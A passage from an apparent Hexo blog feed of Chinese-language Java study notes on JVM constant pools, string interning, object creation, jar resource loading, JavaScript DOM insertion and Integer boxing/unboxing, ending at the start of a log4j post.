<p>jvm在执行某个类的时候，必须经过<strong>加载</strong>、<strong>连接</strong>、<strong>初始化</strong>，而连接又包括<strong>验证</strong>、<strong>准备</strong>、<strong>解析</strong>三个阶段。</p>
<p><img src="https://i.loli.net/2021/10/23/kHBcp5PF6h2ZdLz.png" alt="image-20211023174945692"></p>
<h2 id="常量池分类"><a href="#常量池分类" class="headerlink" title="常量池分类"></a>常量池分类</h2><p>常量池可分为三类：class文件常量池、运行时常量池、全局字符串池</p>
<ol>
<li><strong>class文件常量池（class constant pool）：</strong></li>
</ol>
<ul>
<li><strong>出现时间：</strong>在类<strong>加载之前</strong>就存在于class文件中了</li>
<li><strong>存放内容：</strong>对象的符号引用值</li>
<li>存放在class文件中</li>
<li>class常量池中存放的是字面量和符号引用，也就是说它们存的不是对象的实例，而是对象的符号引用值</li>
</ul>
<ol start="2">
<li><strong>运行时常量池（runtime constant pool）：</strong>通常所说的常量池，指的就是运行时常量池 </li>
</ol>
<ul>
<li><strong>出现时间：</strong>在类加载之后</li>
<li><strong>存放内容：</strong>对象的符号引用值，经过解析阶段后，替换为直接引用</li>
<li>在class文件被加载进了内存之后，常量池保存在了方法区中，所以，<strong>每一个类都有一个运行时常量池</strong></li>
<li>在class文件加载之后，jvm就会将class常量池中的<strong>符号引用解析后，<u>替换为直接引用</u>，</strong>存放到运行时常量池中（也就是符号引用）</li>
</ul>
<ol start="3">
<li><strong>全局字符串池（String pool或者String literal poll）：</strong></li>
</ol>
<ul>
<li><strong>出现时间：</strong>在准备阶段之后（因为解析阶段运行时常量池需要查询全局字符串）</li>
<li><strong>存放内容：</strong>驻留字符串的引用</li>
<li>在类加载完成，经过验证，准备阶段之后，在堆中生成字符串对象实例之后，再将<strong>该字符串对象实例的引用值</strong>存到string pool中。</li>
<li>string pool的功能由谁实现？由StringTable类实现，它是一个哈希表，里面存的是驻留字符串的引用，可以<strong>依据它找到堆中的字符串实例</strong></li>
<li>这个StringTable在每个htoSpot  VM 的实例只有一份，也就是说它<strong>被所有的类共享</strong></li>
<li>==<strong>在jdk1.7版本以后，字符串池已经不在方法区，移到了堆中了</strong>==</li>
</ul>
<p><img src="https://i.loli.net/2021/10/23/Q3Cye58TvcFBI7L.png" alt="image-20211023224256460"></p>
<h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String str1 = <span class="string">&quot;abc&quot;</span>;</span><br><span class="line">String str2 = <span class="keyword">new</span> String(<span class="string">&quot;def&quot;</span>);</span><br><span class="line">String str3 = <span class="string">&quot;abc&quot;</span>;</span><br><span class="line">String str4 = str2.intern();</span><br><span class="line">String str5 = <span class="string">&quot;def&quot;</span>;</span><br><span class="line">String str6 = <span class="string">&quot;def&quot;</span>+<span class="string">&quot;ine&quot;</span>;</span><br><span class="line"></span><br><span class="line">System.out.println(str1 == str3);<span class="comment">//true</span></span><br><span class="line">System.out.println(str2 == str4);<span class="comment">//false</span></span><br><span class="line">System.out.println(str4 == str5);<span class="comment">//true</span></span><br></pre></td></tr></table></figure>

<p>上面的例子虽然简单，但是，几种情况都已经囊括在内了</p>
<h3 id="分析第一句"><a href="#分析第一句" class="headerlink" title="分析第一句"></a>分析第一句</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String str1 = <span class="string">&quot;abc&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>这一句，在类加载完成后，首先，会在堆中生成一个“abc”实例；然后全局StringTable中存放着“abc”的引用值</p>
<h3 id="分析第二句（注意点）"><a href="#分析第二句（注意点）" class="headerlink" title="分析第二句（注意点）"></a>分析第二句（注意点）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String str2 = <span class="keyword">new</span> String(<span class="string">&quot;def&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>这一句，在类加载完成后，首先，会在堆中生成一个“def”实例；然后全局StringTable中存放着“def”的引用值；接着，new 出来一个”def“的实例（这两个实例不是同一个）；</p>
<p><strong>生成了两个对象实例！！！</strong></p>
<p><strong>生成了两个对象实例！！！</strong></p>
<p><strong>生成了两个对象实例！！！</strong></p>
<p><img src="https://i.loli.net/2021/10/23/uOVLGdvJUoc6n2f.png" alt="image-20211023183033844"></p>
<p><strong>反编译后可以看到，该语句产生了两个实例</strong></p>
<p><strong>重点：</strong>new出来的字符串实例，和在全局字符串值中对应的那个字符串实例，是不同的实例</p>
<h3 id="分析第三句"><a href="#分析第三句" class="headerlink" title="分析第三句"></a>分析第三句</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String str3 = <span class="string">&quot;abc&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>这一句，在类加载完成后，进行解析，会在StringTable里面找到”abc”的全局驻留字符串引用，所以str3的引用地址与之前的那个已存在的相同</p>
<h3 id="分析第四句（关键是intern函数）"><a href="#分析第四句（关键是intern函数）" class="headerlink" title="分析第四句（关键是intern函数）"></a>分析第四句（关键是intern函数）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String str4 = str2.intern();</span><br></pre></td></tr></table></figure>

<p>这一句，在类加载完成后，str4是在运行的时候调用**<code>intern()函数</code>**，返回StringTable中”def”的引用值，如果没有就将str2的引用值添加进去，在这里，StringTable中已经有了”def”的引用值了，所以返回上面在new str2的时候添加到StringTable中的 “def”引用值</p>
<p><img src="https://i.loli.net/2021/10/23/Lv9Wh2H74ZwSAkg.png" alt="image-20211023183338749"></p>
<p><strong>分析反编译后的代码，可以看到，该语句并没有生成新的字符串对象</strong></p>
<h3 id="分析第五句"><a href="#分析第五句" class="headerlink" title="分析第五句"></a>分析第五句</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String str5 = <span class="string">&quot;def&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>这一句，在类加载完成后，在这里，由于StringTable中已经有了”def”的引用值了，所以返回上面在new str2的时候添加到StringTable中的 “def”引用值</p>
<h3 id="分析第六句"><a href="#分析第六句" class="headerlink" title="分析第六句"></a>分析第六句</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String str6 = <span class="string">&quot;def&quot;</span>+<span class="string">&quot;ine&quot;</span>;</span><br></pre></td></tr></table></figure>

<p><code>javac</code>编译器会在编译过程进行一个<strong>常量折叠（Constant Folding）</strong>的代码优化。经过代码优化之后，这句编译结果是<code>String str6 = &quot;define&quot;;</code></p>
<p>同时，这一句的<code>def</code>和<code>ine</code>不会进到字符串常量池中判断有无，是否需要添加进字符串常量池；</p>
<p>而是只判断一下<code>define</code>是否需要添加进字符串常量池中</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>java的常量池主要有这么几个内容：</p>
<ol>
<li>class常量池：①在编译后就有  ②存储的是对象的符号引用</li>
<li>全局字符串池：①在准备阶段后、解析阶段前出现  ②存储的是驻留字符串的引用  ③运行时常量池在解析阶段，要进行查询，确保两个常量池的引用时一致的</li>
<li>运行时常量池：显示class常量池中的引用，解析阶段后替换为对象的直接引用</li>
</ol>
<h2 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    String a = <span class="string">&quot;a&quot;</span>;</span><br><span class="line">    String b = <span class="string">&quot;b&quot;</span>;</span><br><span class="line">    String ab = <span class="string">&quot;ab&quot;</span>;</span><br><span class="line">    String c = <span class="string">&quot;a&quot;</span> + <span class="string">&quot;b&quot;</span>;</span><br><span class="line">    String d = a + <span class="string">&quot;b&quot;</span>;</span><br><span class="line">    String e = a + b;</span><br><span class="line">    String a2 = <span class="keyword">new</span> String(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">    String ab2 = a2 + b;</span><br><span class="line">    String ab3 = a2 + <span class="string">&quot;b&quot;</span>;</span><br><span class="line">    System.out.println(a == a2);        <span class="comment">//false</span></span><br><span class="line">    System.out.println(ab == c);        <span class="comment">//true</span></span><br><span class="line">    System.out.println(c == d);         <span class="comment">//false</span></span><br><span class="line">    System.out.println(c == e);         <span class="comment">//false</span></span><br><span class="line">    System.out.println(d == e);         <span class="comment">//false</span></span><br><span class="line">    System.out.println(ab2 == ab);      <span class="comment">//false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>在上述例子中，得出一下结论：</strong></p>
<p><strong>①直接用引号的（可以有+号进行连接），内容也一样的，引用的就是一个对象</strong></p>
<p><strong>②如果出现类似<code>String c = b + &quot;a&quot;;</code>这样的，那么就是在堆中生成了一个新的对象。</strong></p>
<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>今天偶然间看到了韩顺平老师在B站讲String的特性的课程，看完后，忽然间觉得自己这块瞬间好像明朗了</p>
<p>（上面的内容虽然也差不多，但总觉得还是繁琐，好像有哪些地方不透彻）</p>
<p>主要是补充对于下面这一句代码的理解（根据韩顺平老师将它底层分析的理解）：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String a = <span class="string">&quot;a&quot;</span>;</span><br><span class="line">String b = <span class="string">&quot;b&quot;</span>;</span><br><span class="line">String ab = a+b;	<span class="comment">//这句是重点，在这一句的背后，底层做了很多事情</span></span><br><span class="line">String c = <span class="string">&quot;ab&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>不知道为什么韩老师的在调试的时候能够step into进去查看底层执行情况，而我的就不行<img src="https://i.loli.net/2021/12/02/dcZDVwAm6FJUvs4.png" alt="img"></p>
<p>但是不影响理解它</p>
<p>显然执行过下面两句后，在字符串常量池中，分别存储了两个字符串：“a”，“b”</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String a = <span class="string">&quot;a&quot;</span>;</span><br><span class="line">String b = <span class="string">&quot;b&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>然后正片开始！</p>
<p>接下来执行：<code>String ab = a + b;</code></p>
<p>其实，这句在底层做了很多事情。</p>
<ol>
<li>先创建了一个空的StringBuilder的对象，这个对象是存储在堆中的（先暂时存储一下字符串数据，主要要使用它的append方法）</li>
<li>然后先向其中追加了“a”（使用的是它的append方法）</li>
<li>然后又向其中追加了“b”（使用的还是它的append方法）</li>
<li>然后执行了（且返回给ab）<code>return new String(value,0,count) </code>（value指的是上面的StringBuilder对象），这样在字符串常量池中就有了“ab”了，同时堆中也new了一个String类型的对象（值就是value中的数据），并且ab就是指向了这个String类型的对象（不是字符串常量池中的）——（这里和是上面的分析第二句是一样的原理）</li>
</ol>
]]></content>
      <tags>
        <tag>JVM内存分析</tag>
        <tag>运行时常量池</tag>
        <tag>class常量池</tag>
        <tag>全局字符串池</tag>
      </tags>
  </entry>
  <entry>
    <title>java内存分析（2）——static静态的原理</title>
    <url>/2021/10/23/java%E5%86%85%E5%AD%98%E5%88%86%E6%9E%90%EF%BC%882%EF%BC%89%E2%80%94%E2%80%94static%E9%9D%99%E6%80%81%E7%9A%84%E5%8E%9F%E7%90%86/</url>
    <content><![CDATA[<h2 id="static成员存储位置"><a href="#static成员存储位置" class="headerlink" title="static成员存储位置"></a>static成员存储位置</h2><span id="more"></span>

<p><strong>类的static修饰的成员，在类被加载进方法区的时候，static同时被加载进方法区中</strong></p>
<h3 id="成员属性"><a href="#成员属性" class="headerlink" title="成员属性"></a>成员属性</h3><h3 id="成员方法"><a href="#成员方法" class="headerlink" title="成员方法"></a>成员方法</h3>]]></content>
      <tags>
        <tag>JVM内存分析</tag>
        <tag>成员可见性</tag>
        <tag>类加载</tag>
        <tag>类释放</tag>
      </tags>
  </entry>
  <entry>
    <title>java内存分析（4）new一个对象，底层做了哪些事情</title>
    <url>/2021/10/23/java%E5%86%85%E5%AD%98%E5%88%86%E6%9E%90%EF%BC%884%EF%BC%89%E2%80%94%E2%80%94new%E4%B8%80%E4%B8%AA%E5%AF%B9%E8%B1%A1%EF%BC%8C%E5%BA%95%E5%B1%82%E5%81%9A%E4%BA%86%E5%93%AA%E4%BA%9B%E4%BA%8B%E6%83%85/</url>
    <content><![CDATA[<h2 id="创建对象过程"><a href="#创建对象过程" class="headerlink" title="创建对象过程"></a>创建对象过程</h2><span id="more"></span>

<p>我们知道：<strong>程序运行最开始，编译器会将.java文件编译为.class文件</strong></p>
<h3 id="举例："><a href="#举例：" class="headerlink" title="举例："></a>举例：</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name = <span class="string">&quot;lion&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age = <span class="number">5555</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Lion is eating!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Animal animal1 = <span class="keyword">new</span> Animal();</span><br><span class="line">        Animal animal2 = <span class="keyword">new</span> Animal();</span><br><span class="line">        </span><br><span class="line">        System.out.println(animal1.name == animal2.name);	<span class="comment">//true</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/23/M8jXEIh4KkZSPls.png" alt="image-20211023144946776"></p>
<p>对上面new一个对象（以Animal类为例）流程解释如下（辅助图中解释一块看）：</p>
<ol>
<li>当需要new一个Animal对象时，首先看方法区中，有无Animal.class的模板：<ul>
<li>若无，则通过<a href="https://liu-ruyang.github.io/2021/08/19/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E7%B1%BB%E5%8A%A0%E8%BD%BD%E7%9A%84%E5%86%85%E5%AD%98%E5%88%86%E6%9E%90/#%E7%B1%BB%E5%8A%A0%E8%BD%BD%E7%9A%84%E5%86%85%E5%AD%98%E5%88%86%E6%9E%90">类加载器</a>将Animal.class加载进方法区中；同时，Animal中的<a href="">静态成员需要被加载进静态方法区中</a>。</li>
<li>若有,直接进行下一步。</li>
</ul>
</li>
<li>new一个对象，将对象存放在堆中</li>
<li>是否需要一个该对象的引用变量。如果需要，就在栈的栈顶生成一个该对象的引用变量</li>
</ol>
<p><strong>注意：</strong></p>
<p><strong>①上面的Animal1和Animal2由于是局部变量，所以存储在栈中；</strong></p>
<p><strong>②而name、age是成员变量，所以跟随着对象存储在堆中</strong></p>
<h3 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h3><p>在上面的例子中，我们还涉及到了常量池的概念，有关常量池的概念，见博客：<a href="https://liu-ruyang.github.io/2021/10/23/java%E5%86%85%E5%AD%98%E5%88%86%E6%9E%90%EF%BC%883%EF%BC%89%E2%80%94%E2%80%94java%E7%9A%84%E5%B8%B8%E9%87%8F%E6%B1%A0%E7%9A%84%E7%90%86%E8%A7%A3/">java中常量池的理解</a></p>
]]></content>
      <tags>
        <tag>JVM内存分析</tag>
        <tag>java基础</tag>
        <tag>new关键字</tag>
        <tag>创建对象</tag>
      </tags>
  </entry>
  <entry>
    <title>java打包后读取resource文件下的路径</title>
    <url>/2023/12/05/java%E6%89%93%E5%8C%85%E5%90%8E%E8%AF%BB%E5%8F%96resource%E6%96%87%E4%BB%B6%E4%B8%8B%E7%9A%84%E8%B7%AF%E5%BE%84/</url>
    <content><![CDATA[<h2 id="java读取文件的相对路径"><a href="#java读取文件的相对路径" class="headerlink" title="java读取文件的相对路径"></a>java读取文件的相对路径</h2><span id="more"></span>

<h3 id="本地运行"><a href="#本地运行" class="headerlink" title="本地运行"></a>本地运行</h3><p>在本地运行时可参考我的另一篇博客：<a href="https://liu-ruyang.github.io/2021/09/07/java%E4%B8%AD%E7%9A%84%E7%9B%B8%E5%AF%B9%E8%B7%AF%E5%BE%84%E7%94%A8%E6%B3%95/">java中的相对路径用法 | 代码流畅，心情舒畅！ (liu-ruyang.github.io)</a></p>
<h3 id="打包后运行"><a href="#打包后运行" class="headerlink" title="打包后运行"></a>打包后运行</h3><p>打包成jar包之后，应该使用classpath的路径，classpath的下一级即为resources或者java文件夹的下一级。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// properties类型文件</span></span><br><span class="line">InputStream inputStream = Main.class.getResourceAsStream(<span class="string">&quot;/params.properties&quot;</span>);</span><br><span class="line">Reader reader = <span class="keyword">new</span> InputStreamReader(inputStream, StandardCharsets.UTF_8);		<span class="comment">// 以utf-8格式读取</span></span><br><span class="line">Properties properties = <span class="keyword">new</span> Properties();</span><br><span class="line">properties.load(reader);</span><br><span class="line"></span><br><span class="line"><span class="comment">// json类型文件（使用com.alibaba.fastjson2依赖）</span></span><br><span class="line">InputStream inputStream = Main.class.getResourceAsStream(<span class="string">&quot;/data.json&quot;</span>);</span><br><span class="line">jsonObject = JSON.parseObject(inputStream, StandardCharsets.UTF_8);</span><br></pre></td></tr></table></figure>

<p><strong>但这样有个致命的缺点：通过class.getResourceAsStream()获取的文件数据会保存在jar文件中，当jar中的该文件需要修改为服务器上或其他位置的文件时，则无法访问（还是打包之前的文件路径）</strong></p>
<blockquote>
<p>原因：jar相当于一个压缩包，会把所有加载的文件保存于其中，且数据不可更改（可以先解压jar文件，再重新打包成jar文件）</p>
</blockquote>
]]></content>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>js创建、插入节点</title>
    <url>/2023/06/21/js%E5%88%9B%E5%BB%BA%E3%80%81%E6%8F%92%E5%85%A5%E8%8A%82%E7%82%B9/</url>
    <content><![CDATA[<h2 id="JavaScript中和插入节点"><a href="#JavaScript中和插入节点" class="headerlink" title="JavaScript中和插入节点"></a>JavaScript中和插入节点</h2><span id="more"></span>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1. 创建节点元素节点</span></span><br><span class="line"><span class="keyword">var</span> li = <span class="built_in">document</span>.createElement(<span class="string">&#x27;li&#x27;</span>);</span><br><span class="line"><span class="comment">// 2. 添加节点 node.appendChild(child)  node 父级  child 是子级 后面追加元素  类似于数组中的push</span></span><br><span class="line"><span class="keyword">var</span> ul = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;ul&#x27;</span>);</span><br><span class="line">ul.appendChild(li);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 添加节点 node.insertBefore(child, 指定元素);</span></span><br><span class="line"><span class="keyword">var</span> lili = <span class="built_in">document</span>.createElement(<span class="string">&#x27;li&#x27;</span>);</span><br><span class="line">ul.insertBefore(lili, ul.children[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure>

<p>总思路：我们想要页面添加一个新的元素 ：</p>
<ol>
<li>创建元素 </li>
<li>添加元素</li>
</ol>
]]></content>
      <tags>
        <tag>javascript</tag>
      </tags>
  </entry>
  <entry>
    <title>Java装箱和拆箱</title>
    <url>/2021/10/16/java%E8%A3%85%E7%AE%B1%E5%92%8C%E6%8B%86%E7%AE%B1/</url>
    <content><![CDATA[<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><span id="more"></span>

<p>简单说</p>
<p><strong>装箱：</strong>装箱就是将基本数据类型转换为包装器类型，通过<strong>valueOf</strong>()函数实现装箱</p>
<p><strong>拆箱：</strong>拆箱就是将包装器类型转换为基本数据类型，通过**×××Value()**函数实现拆箱</p>
<p><strong>自动装箱：</strong>装箱中有一种非显示地装箱，即隐式装箱</p>
<p><strong>自动拆箱：</strong>拆箱中有一种非显示地拆箱，即隐式拆箱</p>
<h3 id="会发生装箱、拆箱的数据类型和包装类型"><a href="#会发生装箱、拆箱的数据类型和包装类型" class="headerlink" title="会发生装箱、拆箱的数据类型和包装类型"></a>会发生装箱、拆箱的数据类型和包装类型</h3><img src="https://i.loli.net/2021/10/16/RqQHhD3mdBe1PvV.png" style="zoom:80%;" />

<h2 id="发生场景"><a href="#发生场景" class="headerlink" title="发生场景"></a>发生场景</h2><p>可以先看原理，再回来自己分析场景</p>
<h3 id="进行传参时，会发生自动装箱和拆箱"><a href="#进行传参时，会发生自动装箱和拆箱" class="headerlink" title="进行传参时，会发生自动装箱和拆箱"></a>进行传参时，会发生自动装箱和拆箱</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">    fun(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">fun</span><span class="params">(Integer n)</span></span>&#123;		<span class="comment">//会进行自动装箱</span></span><br><span class="line">    System.out.println(n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="包装类和基本类型的大小比较"><a href="#包装类和基本类型的大小比较" class="headerlink" title="包装类和基本类型的大小比较"></a>包装类和基本类型的大小比较</h3><ul>
<li>两个都为包装类型，比较的是地址（可能是一个对象，也有可能不是一个对象）</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Integer a = <span class="number">1</span>;        </span><br><span class="line">Integer b = <span class="number">1</span>;</span><br><span class="line">Integer c = <span class="number">888</span>;</span><br><span class="line">Integer d = <span class="number">888</span>;</span><br><span class="line">System.out.println(a.equals(b));	<span class="comment">//true，比较的是内容（包装类型比较建议使用equals）</span></span><br><span class="line">System.out.println(a == b);			<span class="comment">//true，两个是同一个对象，存储在内存中的数组中，包装类型中==比较的是地址</span></span><br><span class="line"></span><br><span class="line">System.out.println(c == d);			<span class="comment">//false，两个虽然数值上相等，但两个是两个对象，==比较的是地址</span></span><br></pre></td></tr></table></figure>

<ul>
<li>两个都为基本数据类型，比较的是数值，并且数值不一样的会自动类型提升</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> e = <span class="number">888</span>;</span><br><span class="line"><span class="keyword">int</span> f = <span class="number">888</span>;</span><br><span class="line">System.out.println(e == f);		<span class="comment">//true，基本数据类型比较的是数值</span></span><br></pre></td></tr></table></figure>

<ul>
<li>一个为包装类型，一个为基本数据类型，先进拆箱，转变为基本数据类型，再比较数值</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Integer a = <span class="number">1</span>;</span><br><span class="line">System.out.println(a == <span class="number">1</span> ? <span class="string">&quot;等于&quot;</span> : <span class="string">&quot;不等于&quot;</span>);	<span class="comment">//等于</span></span><br></pre></td></tr></table></figure>

<h3 id="包装类型（和基本类型）的运算"><a href="#包装类型（和基本类型）的运算" class="headerlink" title="包装类型（和基本类型）的运算"></a>包装类型（和基本类型）的运算</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> i = <span class="number">1</span>;</span><br><span class="line">Integer j = <span class="number">2</span>;	<span class="comment">//自动装箱</span></span><br><span class="line">j = j + i;		<span class="comment">//先自动拆箱，再自动装箱</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> a = <span class="number">888</span>;</span><br><span class="line">Integer c = <span class="number">888</span>;</span><br><span class="line">Integer d = <span class="number">1776</span>;</span><br><span class="line">System.out.println(d == (a + c));		<span class="comment">//true，a+c先将c拆箱，得到基本类型，再将基本类型与包装类型比较，又将包装类型d拆箱，得到两个基础数据类型，两个基本类型进行数值比较</span></span><br></pre></td></tr></table></figure>

<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>当数据类型发生转变时，会发生装箱或者拆箱</p>
<p>当运算的时候，也会发生拆箱、再装箱</p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>不同数据类型的**×××Value()<strong>和</strong>valueOf()**的底层实现不同</p>
<p>所以，下面以<strong>Integer</strong>为例：</p>
<h3 id="Integer装箱"><a href="#Integer装箱" class="headerlink" title="Integer装箱"></a>Integer装箱</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Integer a = <span class="number">1</span>;	<span class="comment">//隐式装箱</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="①对生成的class类进行反编译"><a href="#①对生成的class类进行反编译" class="headerlink" title="①对生成的class类进行反编译"></a>①对生成的class类进行反编译</h4><img src="https://i.loli.net/2021/10/16/qOka5gSH1KZe2tb.png" alt="image-20211016175456093" style="zoom: 67%;" />

<p>可以看到调用了**Integer.valueOf()**方法，执行了装箱</p>
<h4 id="②查看底层源码"><a href="#②查看底层源码" class="headerlink" title="②查看底层源码"></a>②查看底层源码</h4><img src="https://i.loli.net/2021/10/16/7hA4R1MiIkPryts.png" alt="image-20211016175855871" style="zoom:80%;" />

<p><strong>解释：</strong>在Integer装箱时，如果值<strong>在-128到127之间</strong>，则会从内存中的<strong>IntegerCache.cache[]数组</strong>中找到现成的数据，以供使用（这个数组中的数据是Integer类的static静态代码块中初始过的，所以程序一运行时，这些数据就在内存中存在了）；<strong>反之</strong>，如果数值<strong>在-128到127之外</strong>，则会重新new一个Integer类型的对象出来（也就出现了地址值不一样的现象）</p>
<h3 id="Integer拆箱"><a href="#Integer拆箱" class="headerlink" title="Integer拆箱"></a>Integer拆箱</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Integer a = <span class="number">1</span>;		<span class="comment">//隐式装箱</span></span><br><span class="line">        <span class="keyword">int</span> b = a;			<span class="comment">//隐式拆箱</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="①对生成的class类进行反编译-1"><a href="#①对生成的class类进行反编译-1" class="headerlink" title="①对生成的class类进行反编译"></a>①对生成的class类进行反编译</h4><img src="https://i.loli.net/2021/10/16/ovxU4sSNOYPfWbi.png" alt="image-20211016180904308" style="zoom:67%;" />

<p>可以看到，调用了**Integer.intValue()**方法，执行了拆箱</p>
<h4 id="②查看底层源码-1"><a href="#②查看底层源码-1" class="headerlink" title="②查看底层源码"></a>②查看底层源码</h4><p><img src="https://i.loli.net/2021/10/16/HYNfkFoyM4rZiel.png" alt="image-20211016181054704"></p>
<img src="https://i.loli.net/2021/10/16/kRnvgIBJOSHVPEz.png" alt="image-20211016181437555" style="zoom:80%;" />

<p><strong>解释：</strong>可以看到，只返回了一个value，这个value其实是Integer的一个成员属性，value的值就是等于装箱的时候new Integer()时候的传入的int基本类型的值（数值），所以拆箱的时候，就是把包装类型的数据转换为基本类型数据</p>
<h3 id="推广其他包装类"><a href="#推广其他包装类" class="headerlink" title="推广其他包装类"></a>推广其他包装类</h3><p>其他包装类和Integer类似，也都时通过是否new一个新的对象，来实现装箱、拆箱</p>
<h2 id="装箱、拆箱目的"><a href="#装箱、拆箱目的" class="headerlink" title="装箱、拆箱目的"></a>装箱、拆箱目的</h2><ol>
<li>自动装箱、拆箱，有助于避免错误的发生：因为将包装类型的对象和基本数据类型进行转换时，自动装箱总是生成一个正确的对象，自动拆箱总是生成一个正确的值</li>
<li>有助于减少内存的浪费：例如Integer类的底层中有一个数组存放一定量的值</li>
</ol>
<h2 id="思考：装箱、拆箱的本质"><a href="#思考：装箱、拆箱的本质" class="headerlink" title="思考：装箱、拆箱的本质"></a>思考：装箱、拆箱的本质</h2><p>装箱和拆箱的本质好像就是值类型和引用类型的互相转换。</p>
<p><strong>装箱是值类型转换为引用类型；</strong></p>
<p><strong>拆箱就是引用类型转换为值类型。</strong></p>
<p><strong>tips：</strong></p>
<p><strong>java中除了int等基本数据类型是值类型外，其余所有的类型都称为引用类型（数组，类，接口，字符串）</strong></p>
]]></content>
      <tags>
        <tag>Java基础</tag>
        <tag>装箱、拆箱</tag>
        <tag>值类型、引用类型</tag>
      </tags>
  </entry>
  <entry>
    <title>log4j.properties的配置</title>
    <url>/2021/10/26/log4j-properties%E7%9A%84%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<h2 id="log4j的常用配置"><a href="#log4j的常用配置" class="headerlink" title="log4j的常用配置"></a>log4j的常用配置</h2><span id="more"></span>

